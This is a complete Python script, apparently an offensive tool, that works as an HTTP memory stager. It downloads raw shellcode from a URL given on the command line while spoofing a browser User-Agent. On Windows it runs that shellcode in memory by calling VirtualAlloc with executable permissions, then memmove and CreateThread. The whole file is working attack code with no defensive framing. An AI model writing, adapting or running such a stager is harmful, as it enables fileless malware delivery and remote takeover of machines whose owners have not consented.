# language: Python 3, file: stager_http.py, target: Windows/Linux
# Memory Stager: downloads a payload from a remote URL and executes it.
import urllib.request
import argparse
import sys
import ctypes

def stage_and_execute(url):
    print(f"[*] Fetching payload from {url}...")
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as resp:
            payload = resp.read()
        print(f"[+] Downloaded {len(payload)} bytes.")
        
        if sys.platform == "win32":
            print("[*] Allocating executable memory...")
            ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(payload), 0x3000, 0x40)
            ctypes.memmove(ptr, payload, len(payload))
            handle = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
            ctypes.windll.kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)
        else:
            print("[!] Shellcode execution is implemented for Windows in this stager.")
    except Exception as e:
        print(f"[!] Stager failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Memory Stager")
    parser.add_argument("--url", required=True, help="URL to download raw payload/shellcode from")
    args = parser.parse_args()
    stage_and_execute(args.url)
